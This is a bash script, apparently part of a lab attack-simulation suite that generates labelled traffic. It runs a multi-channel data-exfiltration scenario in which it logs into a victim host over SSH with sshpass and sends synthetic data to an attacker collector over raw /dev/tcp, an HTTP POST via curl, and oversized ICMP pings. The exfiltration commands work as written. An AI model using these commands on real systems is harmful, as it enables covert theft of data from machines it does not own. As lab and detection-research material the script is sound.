#!/usr/bin/env bash
# S12 — Data exfiltration multi-channel. Kategori: Analysis/Backdoor.
# Victim = client-1 (push data sintetis) -> collector = attacker.
# Channel: (1) TCP mentah via /dev/tcp, (2) HTTP POST (curl), (3) ICMP payload (ping).
# Fase: LINUX (client-1 nyala). Butuh sshpass di attacker.
SCN=S12; ATTACK_CAT=Analysis; PHASE=linux
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool sshpass; need_tool nc
banner
ensure_up "$CLIENT1"

O="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=password -o PubkeyAuthentication=no"
NCLOG="$HERE/s12-recv-nc.bin"

echo "== start collector di attacker: nc:4444 + http:8080 =="
nc -l -p 4444 > "$NCLOG" 2>/dev/null & NCPID=$!
( command -v python3 >/dev/null && python3 -m http.server 8080 >/dev/null 2>&1 ) & HTPID=$!
sleep 2
cleanup(){ kill "$NCPID" "$HTPID" 2>/dev/null || true; }
trap cleanup EXIT

mark_start "$CLIENT1->$ATTACKER_IP"
echo "== di client-1: buat data sintetis & exfil via 3 channel =="
sshpass -p "$LIN_PASS" ssh $O "$LIN_USER@$CLIENT1" bash -s "$ATTACKER_IP" <<'REMOTE'
set -e
A="$1"
F="$(mktemp)"; base64 /dev/urandom | head -c 200000 > "$F"   # ~200KB "sensitive" sintetis
echo "  [1] TCP mentah /dev/tcp -> $A:4444"
exec 3<>/dev/tcp/$A/4444; cat "$F" >&3; exec 3>&- || true
sleep 1
echo "  [2] HTTP POST -> $A:8080/exfil"
curl --max-time 6 -s -X POST --data-binary @"$F" "http://$A:8080/exfil" -o /dev/null || true
sleep 1
echo "  [3] ICMP payload besar -> $A (30 paket x 1200B)"
ping -c 30 -i 0.3 -s 1200 "$A" >/dev/null 2>&1 || true
rm -f "$F"
echo "  exfil selesai di $(hostname)"
REMOTE
sleep 2
mark_end "$CLIENT1->$ATTACKER_IP"
echo "Diterima nc: $(wc -c < "$NCLOG" 2>/dev/null || echo 0) byte -> $NCLOG"
# CAVEAT: s12-recv-nc.bin cuma bukti terima; aman dihapus, jangan di-commit (di .gitignore paket).
